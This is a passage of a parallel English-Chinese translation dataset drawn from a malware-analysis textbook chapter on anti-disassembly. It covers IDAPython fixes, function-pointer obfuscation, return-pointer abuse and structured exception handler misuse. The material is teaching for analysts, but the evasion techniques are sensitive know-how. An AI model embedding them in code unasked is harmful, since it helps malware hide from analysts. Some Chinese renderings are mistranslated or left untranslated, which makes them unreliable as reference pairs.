  prefs: []
  type: TYPE_NORMAL
  zh: E8 db 0E8h
- en: ; ------------------------------------------------------------
  id: totrans-430
  prefs: []
  type: TYPE_NORMAL
  zh: ; ------------------------------------------------------------
- en: 58 pop eax
  id: totrans-431
  prefs: []
  type: TYPE_NORMAL
  zh: 58 pop eax
- en: C3 retn
  id: totrans-432
  prefs: []
  type: TYPE_NORMAL
  zh: C3 retn
- en: This is a somewhat acceptable solution because it shows only the instructions
    that are relevant to understanding the program. However, this solution may interfere
    with analysis processes such as graphing, since it’s difficult to tell exactly
    how the xor instruction or the pop and retn sequences are executed.
  id: totrans-433
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个相对可接受的解决方案，因为它只显示了理解程序相关的指令。然而，此解决方案可能会干扰分析过程，如绘图，因为很难确切知道xor指令或pop和retn序列是如何执行的。
- en: A more complete solution would be to use the PatchByte function from the IDC
    scripting language to modify remaining bytes so that they appear as NOP
  id: totrans-434
  prefs: []
  type: TYPE_NORMAL
  zh: 一个更完整的解决方案是使用IDC脚本语言的PatchByte函数来修改剩余的字节，使它们看起来像NOP
- en: instructions.
  id: totrans-435
  prefs: []
  type: TYPE_NORMAL
  zh: 指令。
- en: 'This example has two areas of undisassembled bytes that we need to convert
    into NOP instructions: 4 bytes starting at memory address 0x004011C0'
  id: totrans-436
  prefs: []
  type: TYPE_NORMAL
  zh: 此示例有两个未反汇编的字节区域，我们需要将其转换为NOP指令：从内存地址0x004011C0开始的4个字节
- en: 'and 3 bytes starting at memory address 0x004011C6\. The following IDAPython
    script will convert these bytes into NOP bytes (0x90):'
  id: totrans-437
  prefs: []
  type: TYPE_NORMAL
  zh: and 3 bytes starting at memory address 0x004011C6。以下IDAPython脚本将这些字节转换为NOP字节（0x90）：
- en: 'def NopBytes(start, length):'
  id: totrans-438
  prefs: []
  type: TYPE_NORMAL
  zh: 'def NopBytes(start, length):'
- en: 'for i in range(0, length):'
  id: totrans-439
  prefs: []
  type: TYPE_NORMAL
  zh: 'for i in range(0, length):'
- en: PatchByte(start + i, 0x90)
  id: totrans-440
  prefs: []
  type: TYPE_NORMAL
  zh: PatchByte(start + i, 0x90)
- en: MakeCode(start)
  id: totrans-441
  prefs: []
  type: TYPE_NORMAL
  zh: MakeCode(start)
- en: NopBytes(0x004011C0, 4)
  id: totrans-442
  prefs: []
  type: TYPE_NORMAL
  zh: NopBytes(0x004011C0, 4)
- en: NopBytes(0x004011C6, 3)
  id: totrans-443
  prefs: []
  type: TYPE_NORMAL
  zh: NopBytes(0x004011C6, 3)
- en: 'This code takes the long approach by making a utility function called NopBytes
    to NOP-out a range of bytes. It then uses that utility function against the two
    ranges that we need to fix. When this script is executed, the resulting disassembly
    is clean, legible, and logically equivalent to the original: 90 nop'
  id: totrans-444
  prefs: []
  type: TYPE_NORMAL
  zh: 此代码采用长方法，通过创建一个名为NopBytes的实用函数来NOP掉一系列字节。然后它使用该实用函数针对我们需要修复的两个范围。当此脚本执行时，生成的反汇编是干净的、可读的，并且逻辑上与原始代码等效：90
    nop
- en: 90 nop
  id: totrans-445
  prefs: []
  type: TYPE_NORMAL
  zh: 90 nop
- en: 90 nop
  id: totrans-446
  prefs: []
  type: TYPE_NORMAL
  zh: 90 nop
- en: 90 nop
  id: totrans-447
  prefs: []
  type: TYPE_NORMAL
  zh: 90 nop
- en: 31 C0 xor eax, eax
  id: totrans-448
  prefs: []
  type: TYPE_NORMAL
  zh: 31 C0 xor eax, eax
- en: 90 nop
  id: totrans-449
  prefs: []
  type: TYPE_NORMAL
  zh: 90 nop
- en: 90 nop
  id: totrans-450
  prefs: []
  type: TYPE_NORMAL
  zh: 90 nop
- en: 90 nop
  id: totrans-451
  prefs: []
  type: TYPE_NORMAL
  zh: 90 nop
- en: 58 pop eax
  id: totrans-452
  prefs: []
  type: TYPE_NORMAL
  zh: 58 pop eax
- en: C3 retn
  id: totrans-453
  prefs: []
  type: TYPE_NORMAL
  zh: C3 retn
- en: Anti-Disassembly
  id: totrans-454
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编
- en: '**339**'
  id: totrans-455
  prefs: []
  type: TYPE_NORMAL
  zh: '**339**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-456
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The IDAPython script we just crafted worked beautifully for this scenario, but
    it is limited in its usefulness when applied to new challenges. To reuse the previous
    script, the malware analyst must decide which offsets and which length of bytes
    to change to NOP instructions, and manually edit the script with the new values.
  id: totrans-457
  prefs: []
  type: TYPE_NORMAL
  zh: 我们刚刚编写的IDAPython脚本在此场景中工作得很好，但它在应用于新挑战时的实用性有限。为了重用之前的脚本，恶意软件分析师必须决定哪些偏移量和字节长度需要更改以转换为NOP指令，并手动使用新值编辑脚本。
- en: '***NOP-ing Out Instructions with IDA Pro***'
  id: totrans-458
  prefs: []
  type: TYPE_NORMAL
  zh: '***使用IDA Pro NOP掉指令***'
- en: With a little IDA Python knowledge, we can develop a script that allows malware
    analysts to easily NOP-out instructions as they see fit. The following script
    establishes the hotkey ALT-N. Once this script is executed, whenever the user
    presses ALT-N, IDA Pro will NOP-out the instruction that is currently at the cursor
    location. It will also conveniently advance the cursor to the next instruction
    to facilitate easy NOP-outs of large blocks of code.
  id: totrans-459
  prefs: []
  type: TYPE_NORMAL
  zh: 有了少量的IDA Python知识，我们可以开发一个脚本，允许恶意软件分析师轻松地将指令NOP掉。以下脚本设置了热键ALT-N。一旦此脚本执行，每当用户按下ALT-N时，IDA
    Pro将NOP掉当前光标位置的指令。它还将光标方便地移动到下一个指令，以方便轻松NOP掉大块代码。
- en: import idaapi
  id: totrans-460
  prefs: []
  type: TYPE_NORMAL
  zh: 导入idaapi
- en: idaapi.CompileLine('static n_key() { RunPythonStatement("nopIt()"); }') AddHotkey("Alt-N",
    "n_key")
  id: totrans-461
  prefs: []
  type: TYPE_NORMAL
  zh: idaapi.CompileLine('static n_key() { RunPythonStatement("nopIt()"); }') AddHotkey("Alt-N",
    "n_key")
- en: 'def nopIt():'
  id: totrans-462
  prefs: []
  type: TYPE_NORMAL
  zh: 'def nopIt():'
- en: start = ScreenEA()
  id: totrans-463
  prefs: []
  type: TYPE_NORMAL
  zh: start = ScreenEA()
- en: end = NextHead(start)
  id: totrans-464
  prefs: []
  type: TYPE_NORMAL
  zh: end = NextHead(start)
- en: 'for ea in range(start, end):'
  id: totrans-465
  prefs: []
  type: TYPE_NORMAL
  zh: 'for ea in range(start, end):'
- en: PatchByte(ea, 0x90)
  id: totrans-466
  prefs: []
  type: TYPE_NORMAL
  zh: PatchByte(ea, 0x90)
- en: Jump(end)
  id: totrans-467
  prefs: []
  type: TYPE_NORMAL
  zh: Jump(end)
- en: Refresh()
  id: totrans-468
  prefs: []
  type: TYPE_NORMAL
  zh: Refresh()
- en: '**Obscuring Flow Control**'
  id: totrans-469
  prefs: []
  type: TYPE_NORMAL
  zh: '**隐藏流程控制**'
- en: Modern disassemblers such as IDA Pro do an excellent job of correlating function
    calls and deducing high-level information based on the knowledge of how functions
    are related to each other. This type of analysis works well against code written
    in a standard programming style with a standard compiler, but is easily defeated
    by the malware author.
  id: totrans-470
  prefs: []
  type: TYPE_NORMAL
  zh: 现代反汇编器，如IDA Pro，在关联函数调用和基于函数之间相互关系的知识推断高级信息方面做得非常出色。这种分析对于用标准编程风格和标准编译器编写的代码效果很好，但很容易被恶意软件作者击败。
- en: '***The Function Pointer Problem***'
  id: totrans-471
  prefs: []
  type: TYPE_NORMAL
  zh: '***函数指针问题***'
- en: Function pointers are a common programming idiom in the C programming language
    and are used extensively behind the scenes in C++. Despite this, they still prove
    to be problematic to a disassembler.
  id: totrans-472
  prefs: []
  type: TYPE_NORMAL
  zh: 函数指针是C编程语言中的一种常见编程习惯，在C++中幕后被广泛使用。尽管如此，它们仍然对反汇编器构成问题。
- en: Using function pointers in the intended fashion in a C program can greatly reduce
    the information that can be automatically deduced about program flow. If function
    pointers are used in handwritten assembly or crafted in a nonstandard way in source
    code, the results can be difficult to reverse-engineer without dynamic analysis.
  id: totrans-473
  prefs: []
  type: TYPE_NORMAL
  zh: 在C程序中以预期的方式使用函数指针可以大大减少可以自动推断出的程序流程信息。如果函数指针在手工汇编中或以非标准方式在源代码中编写，则可能需要动态分析才能难以反汇编。
- en: The following assembly listing shows two functions. The second function uses
    the first through a function pointer.
  id: totrans-474
  prefs: []
  type: TYPE_NORMAL
  zh: 以下汇编代码列表显示了两个函数。第二个函数通过函数指针调用了第一个函数。
- en: '**340**'
  id: totrans-475
  prefs: []
  type: TYPE_NORMAL
  zh: '**340**'
- en: Chapter 15
  id: totrans-476
  prefs: []
  type: TYPE_NORMAL
  zh: 第15章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-477
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '004011C0 sub_4011C0 proc near ; DATA XREF: sub_4011D0+5o 004011C0'
  id: totrans-478
  prefs: []
  type: TYPE_NORMAL
  zh: '004011C0 sub_4011C0 proc near ; DATA XREF: sub_4011D0+5o 004011C0'
- en: 004011C0 arg_0 = dword ptr 8
  id: totrans-479
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C0 arg_0 = dword ptr 8
- en: 004011C0
  id: totrans-480
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C0
- en: 004011C0 push ebp
  id: totrans-481
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C0 push ebp
- en: 004011C1 mov ebp, esp
  id: totrans-482
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C1 mov ebp, esp
- en: 004011C3 mov eax, [ebp+arg_0]
  id: totrans-483
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C3 mov eax, [ebp+arg_0]
- en: 004011C6 shl eax, 2
  id: totrans-484
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C6 shl eax, 2
- en: 004011C9 pop ebp
  id: totrans-485
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C9 pop ebp
- en: 004011CA retn
  id: totrans-486
  prefs: []
  type: TYPE_NORMAL
  zh: 004011CA retn
- en: 004011CA sub_4011C0 endp
  id: totrans-487
  prefs: []
  type: TYPE_NORMAL
  zh: 004011CA sub_4011C0 endp
- en: '004011D0 sub_4011D0 proc near ; CODE XREF: _main+19p 004011D0 ; sub_401040+8Bp
    004011D0'
  id: totrans-488
  prefs: []
  type: TYPE_NORMAL
  zh: '004011D0 sub_4011D0 proc near ; CODE XREF: _main+19p 004011D0 ; sub_401040+8Bp
    004011D0'
- en: 004011D0 var_4 = dword ptr -4
  id: totrans-489
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D0 var_4 = dword ptr -4
- en: 004011D0 arg_0 = dword ptr 8
  id: totrans-490
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D0 arg_0 = dword ptr 8
- en: 004011D0
  id: totrans-491
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D0
- en: 004011D0 push ebp
  id: totrans-492
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D0 push ebp
- en: 004011D1 mov ebp, esp
  id: totrans-493
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D1 mov ebp, esp
- en: 004011D3 push ecx
  id: totrans-494
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D3 push ecx
- en: 004011D4 push esi
  id: totrans-495
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D4 push esi
- en: 004011D5 mov [ebp+var_4], offset sub_4011C0
  id: totrans-496
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D5 mov [ebp+var_4], offset sub_4011C0
- en: 004011DC push 2Ah
  id: totrans-497
  prefs: []
  type: TYPE_NORMAL
  zh: 004011DC push 2Ah
- en: 004011DE call [ebp+var_4]
  id: totrans-498
  prefs: []
  type: TYPE_NORMAL
  zh: 004011DE call [ebp+var_4]
- en: 004011E1 add esp, 4
  id: totrans-499
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E1 add esp, 4
- en: 004011E4 mov esi, eax
  id: totrans-500
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E4 mov esi, eax
- en: 004011E6 mov eax, [ebp+arg_0]
  id: totrans-501
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E6 mov eax, [ebp+arg_0]
- en: 004011E9 push eax
  id: totrans-502
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E9 push eax
- en: 004011EA call [ebp+var_4]
  id: totrans-503
  prefs: []
  type: TYPE_NORMAL
  zh: 004011EA call [ebp+var_4]
- en: 004011ED add esp, 4
  id: totrans-504
  prefs: []
  type: TYPE_NORMAL
  zh: 004011ED add esp, 4
- en: 004011F0 lea eax, [esi+eax+1]
  id: totrans-505
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F0 lea eax, [esi+eax+1]
- en: 004011F4 pop esi
  id: totrans-506
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F4 pop esi
- en: 004011F5 mov esp, ebp
  id: totrans-507
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F5 mov esp, ebp
- en: 004011F7 pop ebp
  id: totrans-508
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F7 pop ebp
- en: 004011F8 retn
  id: totrans-509
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F8 retn
- en: 004011F8 sub_4011D0 endp
  id: totrans-510
  prefs: []
  type: TYPE_NORMAL
  zh: 004011F8 sub_4011D0 endp
- en: While this example isn’t particularly difficult to reverse-engineer, it does
    expose one key issue. The function sub_4011C0 is actually called from two different
    places ( and ) within the sub_4011D0 function, but it shows only one cross-reference
    at . This is because IDA Pro was able to detect the initial reference to the
    function when its offset was loaded into a stack variable on line 004011D5\. What
    IDA Pro does not detect, however, is the fact that this function is then called
    twice from the locations  and . Any function prototype information that would
    normally be autopropagated to the calling function is also lost.
  id: totrans-511
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然这个例子并不特别困难，但它确实暴露了一个关键问题。函数sub_4011C0实际上是从sub_4011D0函数中的两个不同位置（和）调用的，但它只显示了处的单个交叉引用。这是因为IDA
    Pro能够在004011D5行将函数偏移加载到栈变量时检测到对函数的初始引用。然而，IDA Pro没有检测到的是，该函数随后从位置和调用了两次。任何通常会被自动传播到调用函数的函数原型信息也丢失了。
- en: When used extensively and in combination with other anti-disassembly techniques,
    function pointers can greatly compound the complexity and difficulty of reverse-engineering.
  id: totrans-512
  prefs: []
  type: TYPE_NORMAL
  zh: 当广泛使用并与其他反汇编技术结合时，函数指针可以极大地增加反汇编的复杂性和难度。
- en: Anti-Disassembly
  id: totrans-513
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编
- en: '**341**'
  id: totrans-514
  prefs: []
  type: TYPE_NORMAL
  zh: '**341**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-515
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Adding Missing Code Cross-References in IDA Pro***'
  id: totrans-516
  prefs: []
  type: TYPE_NORMAL
  zh: '**在IDA Pro中添加缺失的代码交叉引用**'
- en: All of the information not autopropagated upward, such as function argument
    names, can be added manually as comments by the malware analyst.
  id: totrans-517
  prefs: []
  type: TYPE_NORMAL
  zh: 所有未自动向上传播的信息，例如函数参数名称，都可以由恶意软件分析师手动添加为注释。
- en: In order to add actual cross-references, we must use the IDC language (or IDAPython)
    to tell IDA Pro that the function sub_4011C0 is actually called from the two locations
    in the other function.
  id: totrans-518
  prefs: []
  type: TYPE_NORMAL
  zh: 为了添加实际的交叉引用，我们必须使用IDC语言（或IDAPython）来告诉IDA Pro，函数sub_4011C0实际上是从其他函数的两个位置调用的。
- en: 'The IDC function we use is called AddCodeXref. It takes three arguments: the
    location the reference is from, the location the reference is to, and a flow type.
    The function can support several different flow types, but for our purposes, the
    most useful are either fl_CF for a normal call instruction or a fl_JF'
  id: totrans-519
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用的 IDC 函数称为 AddCodeXref。它接受三个参数：引用的来源位置、引用的目标位置和流程类型。该函数可以支持几种不同的流程类型，但对我们来说，最有用的是
    fl_CF，用于正常调用指令或 fl_JF
- en: 'for a jump instruction. To fix the previous example assembly code listing in
    IDA Pro, the following script was executed:'
  id: totrans-520
  prefs: []
  type: TYPE_NORMAL
  zh: 对于一个跳转指令。为了修复 IDA Pro 中的先前汇编代码列表，执行了以下脚本：
- en: AddCodeXref(0x004011DE, 0x004011C0, fl_CF);
  id: totrans-521
  prefs: []
  type: TYPE_NORMAL
  zh: AddCodeXref(0x004011DE, 0x004011C0, fl_CF);
- en: AddCodeXref(0x004011EA, 0x004011C0, fl_CF);
  id: totrans-522
  prefs: []
  type: TYPE_NORMAL
  zh: AddCodeXref(0x004011EA, 0x004011C0, fl_CF);
- en: '***Return Pointer Abuse***'
  id: totrans-523
  prefs: []
  type: TYPE_NORMAL
  zh: '***返回指针滥用***'
- en: The call and jmp instructions are not the only instructions to transfer control
    within a program. The counterpart to the call instruction is retn (also represented
    as ret). The call instruction acts just like the jmp instruction, except it pushes
    a return pointer on the stack. The return point will be the memory address immediately
    following the end of the call instruction itself.
  id: totrans-524
  prefs: []
  type: TYPE_NORMAL
  zh: call 和 jmp 指令并不是唯一在程序内部转移控制的指令。call 指令的对立面是 retn（也代表为 ret）。call 指令的行为就像 jmp
    指令一样，除了它在栈上推送一个返回指针。返回点将是 call 指令本身结束后的内存地址。
- en: As call is a combination of jmp and push, retn is a combination of pop and jmp.
    The retn instruction pops the value from the top of the stack and jumps to it.
    It is typically used to return from a function call, but there is no architectural
    reason that it can’t be used for general flow control.
  id: totrans-525
  prefs: []
  type: TYPE_NORMAL
  zh: As call 是 jmp 和 push 的组合，retn 是 pop 和 jmp 的组合。retn 指令从栈顶弹出值并跳转到该值。它通常用于从函数调用中返回，但没有架构上的原因说明它不能用于通用流程控制。
- en: When the retn instruction is used in ways other than to return from a function
    call, even the most intelligent disassemblers can be left in the dark.
  id: totrans-526
  prefs: []
  type: TYPE_NORMAL
  zh: 当 retn 指令以除从函数调用返回之外的方式使用时，即使是最高明的反汇编器也可能一无所知。
- en: The most obvious result of this technique is that the disassembler doesn’t show
    any code cross-reference to the target being jumped to. Another key benefit of
    this technique is that the disassembler will prematurely terminate the function.
  id: totrans-527
  prefs: []
  type: TYPE_NORMAL
  zh: 这种技术的最明显结果是反汇编器不会显示任何代码交叉引用到跳转的目标。这种技术的另一个关键好处是反汇编器会提前终止函数。
- en: 'Let’s examine the following assembly fragment:'
  id: totrans-528
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们检查以下汇编片段：
- en: '004011C0 sub_4011C0 proc near ; CODE XREF: _main+19p 004011C0 ; sub_401040+8Bp
    004011C0'
  id: totrans-529
  prefs: []
  type: TYPE_NORMAL
  zh: '004011C0 sub_4011C0 proc near ; CODE XREF: _main+19p 004011C0 ; sub_401040+8Bp
    004011C0'
- en: 004011C0 var_4 = byte ptr -4
  id: totrans-530
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C0 var_4 = byte ptr -4
- en: 004011C0
  id: totrans-531
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C0
- en: 004011C0 call $+5
  id: totrans-532
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C0 call $+5
- en: 004011C5 add [esp+4+var_4], 5
  id: totrans-533
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C5 添加 [esp+4+var_4], 5
- en: 004011C9 retn
  id: totrans-534
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C9 retn
- en: 004011C9 sub_4011C0 endp ; sp-analysis failed
  id: totrans-535
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C9 sub_4011C0 endp ; sp-analysis failed
- en: 004011C9
  id: totrans-536
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C9
- en: '**342**'
  id: totrans-537
  prefs: []
  type: TYPE_NORMAL
  zh: '**342**'
- en: Chapter 15
  id: totrans-538
  prefs: []
  type: TYPE_NORMAL
  zh: 第 15 章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-539
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004011CA ; ------------------------------------------------------------
  id: totrans-540
  prefs: []
  type: TYPE_NORMAL
  zh: 004011CA ; ------------------------------------------------------------
- en: 004011CA push ebp
  id: totrans-541
  prefs: []
  type: TYPE_NORMAL
  zh: 004011CA push ebp
- en: 004011CB mov ebp, esp
  id: totrans-542
  prefs: []
  type: TYPE_NORMAL
  zh: 004011CB mov ebp, esp
- en: 004011CD mov eax, [ebp+8]
  id: totrans-543
  prefs: []
  type: TYPE_NORMAL
  zh: 004011CD mov eax, [ebp+8]
- en: 004011D0 imul eax, 2Ah
  id: totrans-544
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D0 imul eax, 2Ah
- en: 004011D3 mov esp, ebp
  id: totrans-545
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D3 mov esp, ebp
- en: 004011D5 pop ebp
  id: totrans-546
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D5 pop ebp
- en: 004011D6 retn
  id: totrans-547
  prefs: []
  type: TYPE_NORMAL
  zh: 004011D6 retn
- en: This is a simple function that takes a number and returns the product of that
    number times 42\. Unfortunately, IDA Pro is unable to deduce any meaningful information
    about this function because it has been defeated by a rogue retn instruction.
    Notice that it has not detected the presence of an argument to this function.
    The first three instructions accomplish the task of jumping to the real start
    of the function. Let’s examine each of these instructions.
  id: totrans-548
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个简单的函数，它接受一个数字并返回该数字乘以 42 的乘积。不幸的是，IDA Pro 无法推断出关于此函数的任何有意义的信息，因为它已被一个恶意的
    retn 指令击败。注意，它没有检测到此函数的参数。前三个指令完成了跳转到函数真实开始的任务。让我们检查这些指令中的每一个。
- en: The first instruction in this function is call $+5\. This instruction simply
    calls the location immediately following itself, which results in a pointer to
    this memory location being placed on the stack. In this specific example, the
    value 0x004011C5 will be placed at the top of the stack after this instruction
    executes. This is a common instruction found in code that needs to be self-referential
    or position-independent, and will be covered in more detail in Chapter 19\.
  id: totrans-549
  prefs: []
  type: TYPE_NORMAL
  zh: 这个函数中的第一条指令是call $+5。这条指令简单地调用其自身之后的地址，这会导致指向该内存位置的指针被放置在栈上。在这个特定示例中，在执行这条指令后，值0x004011C5将被放置在栈顶。这是一个在需要自引用或位置无关的代码中常见的指令，将在第19章中更详细地介绍。
- en: The next instruction is add [esp+4+var_4], 5\. If you are used to reading IDA
    Pro disassembly, you might think that this instruction is referencing a stack
    variable var_4\. In this case, IDA Pro’s stack-frame analysis was incorrect, and
    this instruction was not referencing what would be a normal stack variable, autonamed
    to var_4 in an ordinary function. This may seem confusing at first, but notice
    that at the top of the function, var_4 is defined as the constant -4\. This means
    that what is inside the brackets is [esp+4+(-4)], which can also be represented
    as [esp+0] or simply [esp]. This instruction is adding five to the value at the
    top of the stack, which was 0x004011C5\. The result of the addition instruction
    is that the value at the top of the stack will be 0x004011CA.
  id: totrans-550
  prefs: []
  type: TYPE_NORMAL
  zh: 下一条指令是add [esp+4+var_4], 5。如果你习惯于阅读IDA Pro反汇编代码，你可能会认为这条指令正在引用一个栈变量var_4。在这种情况下，IDA
    Pro的栈帧分析是错误的，这条指令并没有引用一个正常的栈变量，在普通函数中自动命名为var_4。这可能会让人一开始感到困惑，但请注意，在函数顶部，var_4被定义为常数-4。这意味着方括号内的内容是[esp+4+(-4)]，也可以表示为[esp+0]或简单地[esp]。这条指令是将五个加到栈顶的值上，该值是0x004011C5。加法指令的结果是栈顶的值将变为0x004011CA。
- en: The last instruction in this sequence is the retn instruction, which has the
    sole purpose of taking this value off the stack and jumping to it. If you examine
    the code at the location 0x004011CA, it appears to be the legitimate beginning
    of a rather normal-looking function. This “real” function was determined by IDA
    Pro to not be part of any function due to the presence of the rogue retn instruction.
  id: totrans-551
  prefs: []
  type: TYPE_NORMAL
  zh: 这个序列中的最后一条指令是retn指令，它的唯一目的是从栈上取出这个值并跳转到它。如果你检查0x004011CA处的代码，它看起来是一个相当正常的函数的合法开始。这个“真实”函数被IDA
    Pro确定为不属于任何函数，因为存在这个恶意的retn指令。
- en: To repair this example, we could patch over the first three instructions with
    NOP instructions and adjust the function boundaries to cover the real function.
  id: totrans-552
  prefs: []
  type: TYPE_NORMAL
  zh: 要修复这个示例，我们可以用NOP指令覆盖前三个指令，并调整函数边界以覆盖实际函数。
- en: To adjust the function boundaries, place the cursor in IDA Pro inside the function
    you wish to adjust and press ALT-P. Adjust the function end address to the memory
    address immediately following the last instruction in the function. To replace
    the first few instructions with nop, refer to the script technique described in
    “NOP-ing Out Instructions with IDA Pro” on page 340\.
  id: totrans-553
  prefs: []
  type: TYPE_NORMAL
  zh: 要调整函数边界，请在IDA Pro中函数内部放置光标，并按ALT-P。调整函数结束地址为函数中最后一条指令之后的内存地址。要替换前几条指令为nop，请参考第340页上“使用IDA
    Pro NOP-out 指令”中描述的脚本技术。
- en: Anti-Disassembly
  id: totrans-554
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编
- en: '**343**'
  id: totrans-555
  prefs: []
  type: TYPE_NORMAL
  zh: '**343**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-556
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Misusing Structured Exception Handlers***'
  id: totrans-557
  prefs: []
  type: TYPE_NORMAL
  zh: '***滥用结构化异常处理程序***'
- en: The Structured Exception Handling (SEH) mechanism provides a method of flow
    control that is unable to be followed by disassemblers and will fool debuggers.
    SEH is a feature of the x86 architecture and is intended to provide a way for
    the program to handle error conditions intelligently. Programming languages such
    as C++ and Ada rely heavily on exception handling and translate naturally to SEH
    when compiled on x86 systems.
  id: totrans-558
  prefs: []
  type: TYPE_NORMAL
  zh: 结构化异常处理（SEH）机制提供了一种无法被反汇编器跟踪的流程控制方法，并且会欺骗调试器。SEH是x86架构的一个特性，旨在为程序提供一种智能处理错误条件的方法。像C++和Ada这样的编程语言在x86系统上编译时，会大量依赖异常处理，并且自然地转换为SEH。
- en: Before exploring how to harness SEH to obscure flow control, let’s look at a
    few basic concepts about how it operates. Exceptions can be triggered for a number
    of reasons, such as access to an invalid memory region or dividing by zero. Additional
    software exceptions can be raised by calling the RaiseException function.
  id: totrans-559
  prefs: []
  type: TYPE_NORMAL
  zh: 在探索如何利用SEH来隐藏流程控制之前，让我们先看看SEH是如何操作的几个基本概念。异常可以由许多原因触发，例如访问无效的内存区域或除以零。可以通过调用RaiseException函数来引发额外的软件异常。
- en: The SEH chain is a list of functions designed to handle exceptions within the
    thread. Each function in the list can either handle the exception or pass it to
    the next handler in the list. If the exception makes it all the way to the last
    handler, then it is considered to be an *unhandled exception*.
  id: totrans-560
  prefs: []
  type: TYPE_NORMAL
  zh: SEH链是用于在线程内处理异常的函数列表。列表中的每个函数都可以处理异常或将它传递给列表中的下一个处理程序。如果异常最终到达最后一个处理程序，那么它被认为是*未处理的异常*。
- en: The last exception handler is the piece of code responsible for triggering the
    familiar message box that informs the user that “an unhandled exception has occurred.”
    Exceptions happen regularly in most processes, but are handled silently before
    they make it to this final state of crashing the process and informing the user.
  id: totrans-561
  prefs: []
  type: TYPE_NORMAL
  zh: 最后的异常处理程序是负责触发用户熟悉的消息框，告知用户“发生了未处理的异常。”异常在大多数过程中都会定期发生，但在它们导致进程崩溃并通知用户之前，通常会被静默处理。
- en: To find the SEH chain, the OS examines the FS segment register. This register
    contains a segment selector that is used to gain access to the Thread Environment
    Block (TEB). The first structure within the TEB is the Thread Information Block
    (TIB). The first element of the TIB (and consequently the first bytes of the TEB)
    is a pointer to the SEH chain. The SEH chain is a simple linked list of 8-byte
    data structures called EXCEPTION_REGISTRATION records.
  id: totrans-562
  prefs: []
  type: TYPE_NORMAL
  zh: 要找到SEH链，操作系统会检查FS段寄存器。该寄存器包含一个段选择符，用于访问线程环境块（TEB）。TEB中的第一个结构是线程信息块（TIB）。TIB的第一个元素（以及因此TEB的第一个字节）是指向SEH链的指针。SEH链是一个简单的8字节数据结构链接列表，称为EXCEPTION_REGISTRATION记录。
- en: struct _EXCEPTION_REGISTRATION {
  id: totrans-563
  prefs: []
  type: TYPE_NORMAL
  zh: struct _EXCEPTION_REGISTRATION {
- en: DWORD prev;
  id: totrans-564
  prefs: []
  type: TYPE_NORMAL
  zh: DWORD prev;
- en: DWORD handler;
  id: totrans-565
  prefs: []
  type: TYPE_NORMAL
  zh: DWORD handler;
- en: '};'
  id: totrans-566
  prefs: []
  type: TYPE_NORMAL
  zh: '};'
- en: The first element in the EXCEPTION_REGISTRATION record points to the previous
    record. The second field is a pointer to the handler function.
  id: totrans-567
  prefs: []
  type: TYPE_NORMAL
  zh: EXCEPTION_REGISTRATION记录中的第一个元素指向前一个记录。第二个字段是指向处理函数的指针。
- en: This linked list operates conceptually as a stack. The first record to be called
    is the last record to be added to the list. The SEH chain grows and shrinks as
    layers of exception handlers in a program change due to subroutine calls and nested
    exception handler blocks. For this reason, SEH records are always built on the
    stack.
  id: totrans-568
  prefs: []
  type: TYPE_NORMAL
  zh: 这个链接列表在概念上作为一个栈来操作。首先被调用的记录是最后添加到列表中的记录。当程序中的子程序调用和嵌套异常处理程序块改变异常处理程序的层级时，SEH链会增长和缩小。因此，SEH记录始终建立在栈上。
- en: In order to use SEH to achieve covert flow control, we need not concern ourselves
    with how many exception records are currently in the chain. We just need to understand
    how to add our own handler to the top of this list, as shown in Figure 15-6\.
  id: totrans-569
  prefs: []
